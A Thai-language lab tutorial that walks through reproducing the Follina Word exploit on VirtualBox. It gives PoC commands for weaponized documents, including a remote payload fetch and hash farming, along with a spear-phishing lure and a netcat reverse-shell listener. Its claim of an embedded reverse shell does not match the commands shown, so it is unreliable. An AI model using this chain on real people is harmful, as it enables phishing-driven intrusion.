# การจำลอง Follina Exploit (CVE-2022-30190) พร้อม Phishing โดยใช้ SET บน VirtualBox

## ภาพรวม
คู่มือนี้ให้ขั้นตอนการจำลองการโจมตี Follina Exploit (CVE-2022-30190) โดยใช้ VirtualBox สองเครื่องเสมือน (Windows 10 และ Kali Linux) รวมถึงการส่งอีเมล Phishing ด้วย Social Engineering Toolkit (SET) เพื่อส่งไฟล์ `clickme.docx` ที่ฝังคำสั่ง PowerShell Reverse Shell การจำลองนี้เน้นความสมจริง โดยไม่ต้องวางไฟล์เพิ่มเติมบนเครื่องเป้าหมาย

## ข้อควรระวัง
- **สภาพแวดล้อมที่แยกจากกัน**: ใช้โหมด **Internal Network** ใน VirtualBox เพื่อป้องกันการเชื่อมต่อกับเครือข่ายภายนอก
- **Snapshot**: บันทึก Snapshot ของเครื่องเสมือนก่อนทดสอบ (`Machine > Take Snapshot`) เพื่อคืนสภาพหากเกิดข้อผิดพลาด
- **ปิด Antivirus**: ปิด Windows Defender ชั่วคราวบน Windows (`Settings > Windows Security > Virus & Threat Protection > Turn off Real-time protection`) เพื่อให้การทดสอบทำงานได้
- **ลบไฟล์หลังทดสอบ**: ลบ `clickme.docx` และโฟลเดอร์ PoC หลังการทดสอบเพื่อป้องกันการใช้งานโดยไม่ตั้งใจ
- **จริยธรรม**: ใช้เพื่อการศึกษาในสภาพแวดล้อมที่ควบคุมเท่านั้น การใช้ในระบบจริงโดยไม่ได้รับอนุญาตเป็นสิ่งผิดกฎหมาย
- **ความปลอดภัยของ Payload**: ตรวจสอบโค้ด PowerShell และสคริปต์ PoC เพื่อป้องกันการรันโค้ดที่ไม่คาดคิด

## การเตรียมเครื่องเสมือน

### 1. ติดตั้ง VirtualBox
- ดาวน์โหลดและติดตั้ง VirtualBox จาก https://www.virtualbox.org/
- ติดตั้ง VirtualBox Extension Pack เพื่อรองรับฟีเจอร์เครือข่าย

### 2. สร้างเครื่องเสมือน Windows 10
- **กำหนดค่า**:
  - ชื่อ: `Windows10_Follina`
  - ระบบปฏิบัติการ: Windows 10 (64-bit)
  - RAM: 4GB, CPU: 2 คอร์, ดิสก์: 50GB
- **ติดตั้ง Windows 10**:
  - ดาวน์โหลด ISO จาก Microsoft Evaluation Center
  - เพิ่ม ISO ใน `Settings > Storage > Controller: IDE`
  - ติดตั้งและปิดการอัปเดต (`Settings > Update & Security > Pause updates`) เพื่อคงช่องโหว่ CVE-2022-30190
- **ติดตั้ง Microsoft Office 2019**:
  - ดาวน์โหลดรุ่นก่อนแพตช์มิถุนายน 2565 และติดตั้ง
- **ติดตั้ง Email Client**:
  - ติดตั้ง Thunderbird จาก https://www.thunderbird.net/
  - กำหนดค่า IMAP/SMTP ไปยัง Kali (`192.168.56.11`, IMAP Port 143, SMTP Port 25)

### 3. สร้างเครื่องเสมือน Kali Linux
- **ดาวน์โหลด**:
  - ดาวน์โหลด ISO จาก https://www.kali.org/get-kali/
- **กำหนดค่า**:
  - ชื่อ: `Kali_Attacker`
  - ระบบปฏิบัติการ: Debian (64-bit)
  - RAM: 2GB, CPU: 2 คอร์, ดิสก์: 20GB
- **ติดตั้งและอัปเดต**:
  - ติดตั้ง Kali และอัปเดต:
    ```bash
    sudo apt update && sudo apt upgrade -y
    ```
  - ติดตั้งเครื่องมือ:
    ```bash
    sudo apt install python3 python3-pip git postfix -y
    pip3 install python-docx
    ```

### 4. กำหนดค่าเครือข่าย
- **โหมดเครือข่าย**: ตั้งทั้งสองเครื่องเป็น **Internal Network** ชื่อ `Follina_Lab`
- **ตั้งค่า IP คงที่**:
  - **Windows 10**:
    - ไปที่ `Control Panel > Network and Sharing Center > Change adapter settings`
    - ตั้ง IP: `192.168.56.10`, Subnet Mask: `255.255.255.0`
  - **Kali Linux**:
    - แก้ไข `/etc/network/interfaces`:
      ```bash
      sudo nano /etc/network/interfaces
      ```
      เพิ่ม:
      ```bash
      auto eth0
      iface eth0 inet static
      address 192.168.56.11
      netmask 255.255.255.0
      ```
    - รีสตาร์ทเครือข่าย:
      ```bash
      sudo systemctl restart networking
      ```
- **ทดสอบการเชื่อมต่อ**:
  - จาก Kali: `ping 192.168.56.10`
  - จาก Windows: `ping 192.168.56.11`

## การสร้าง Payload และ Phishing

### 5. สร้าง `clickme.docx` บน Kali
- **ดาวน์โหลด PoC**:
  ```bash
  git clone https://github.com/DarkRelay-Security-Labs/CVE-2022-30190-Follina-exploit
  cd CVE-2022-30190-Follina-exploit
  ```
- **สร้างไฟล์ `clickme.docx` สามารถใช้คำสั่งได้ตามนี้**:

  ```bash
  # Execute a local binary
  python follina.py -t docx -m binary -b \windows\system32\calc.exe
  
  # On linux you may have to escape backslashes
  python follina.py -t rtf -m binary -b \\windows\\system32\\calc.exe
  
  # Execute a binary from a file share (can be used to farm hashes 👀)
  python follina.py -t docx -m binary -b \\localhost\c$\windows\system32\calc.exe
  
  # Execute an arbitrary powershell command
  python follina.py -t rtf -m command -c "Start-Process c:\windows\system32\cmd.exe -WindowStyle hidden -ArgumentList '/c echo owned > c:\users\public\owned.txt'"
  
  # Run the web server on the default interface (all interfaces, 0.0.0.0), but tell the malicious document to retrieve it at http://1.2.3.4/exploit.html
  python follina.py -t docx -m binary -b \windows\system32\calc.exe -u 1.2.3.4
  
  # Only run the webserver on localhost, on port 8080 instead of 80
  python follina.py -t rtf -m binary -b \windows\system32\calc.exe -H 127.0.0.1 -P 8080
  ```
  
- **ผลลัพธ์**: ได้ไฟล์ `clickme.docx` ที่ฝังคำสั่ง PowerShell Reverse Shell

### 6. ตั้งค่าเซิร์ฟเวอร์ SMTP บน Kali
- **กำหนดค่า Postfix**:
  ```bash
  sudo nano /etc/postfix/main.cf
  ```
  แก้ไข:
  ```bash
  myhostname = kali.local
  mydomain = local
  mydestination = $myhostname, localhost.$mydomain, localhost
  mynetworks = 192.168.56.0/24
  inet_interfaces = all
  ```
  รีสตาร์ท:
  ```bash
  sudo systemctl restart postfix
  ```
- **ตรวจสอบ**:
  ```bash
  sudo netstat -tulnp | grep 25
  ```

### 7. ส่งอีเมล Phishing ด้วย SET
- **เริ่ม SET**:
  ```bash
  sudo setoolkit
  ```
- **เลือกตัวเลือก**:
  - `1) Social-Engineering Attacks`
  - `2) Spear-Phishing Attack Vectors`
  - `3) Create a FileFormat Payload`
- **กำหนดค่า**:
  - อัปโหลด `clickme.docx` ไปยัง `/root/.set/payloads/`
  - เปลี่ยนชื่อเป็น `important_document.docx`
  - เลือกเทมเพลตอีเมล:
    ```
    Subject: Urgent: Document Review Required
    Dear User,
    Please review the attached document for critical updates.
    Regards,
    IT Department
    ```
  - ตั้งค่า SMTP Server: `192.168.56.11`
  - ผู้ส่ง: `it@local`, ผู้รับ: `victim@local`
- **ส่งอีเมล**

### 8. ตั้งค่า Listener บน Kali
- เริ่ม Netcat:
  ```bash
  nc -lvnp 4444
  ```

## การทดสอบการโจมตี

### 9. รับและเปิดอีเมลบน Windows
- เปิด Thunderbird บน Windows
- รับอีเมลจาก `it@local` และดาวน์โหลดไฟล์แนบ `important_document.docx`
- เปิดไฟล์ด้วย Microsoft Word

### 10. สังเกตผลลัพธ์
- เมื่อเปิด `important_document.docx`:
  - คำสั่ง PowerShell Reverse Shell จะรันและเชื่อมต่อกลับไปที่ Kali (`192.168.56.11:4444`)
- บน Kali:
  - Netcat จะแสดง PowerShell Prompt เช่น:
    ```
    PS C:\Users\Victim> whoami
    ```
  - ทดสอบคำสั่ง เช่น `dir`, `systeminfo`

## บทสรุป
การจำลองนี้แสดงให้เห็นถึงอันตรายของ Follina Exploit ที่สามารถรันโค้ดระยะไกลผ่านเอกสาร Word โดยไม่ต้องใช้ไฟล์เพิ่มเติม การใช้ SET และ Postfix จำลองสถานการณ์ Phishing ที่สมจริง การทดสอบนี้เน้นความสำคัญของการอัปเดตซอฟต์แวร์และการระวังไฟล์แนบที่ไม่น่าเชื่อถือ

## อ้างอิง
- Follina PoC: https://github.com/DarkRelay-Security-Labs/CVE-2022-30190-Follina-exploit
- DarkRelay: https://www.darkrelay.com/post/vulnerability-and-exploit-analysis-cve-2022-30190-follina
- HackTheBox: https://www.hackthebox.com/blog/cve-2022-30190-follina-explained
- Securelist: https://securelist.com/cve-2022-30190-follina-vulnerability-in-msdt-description-and-counteraction/106703/
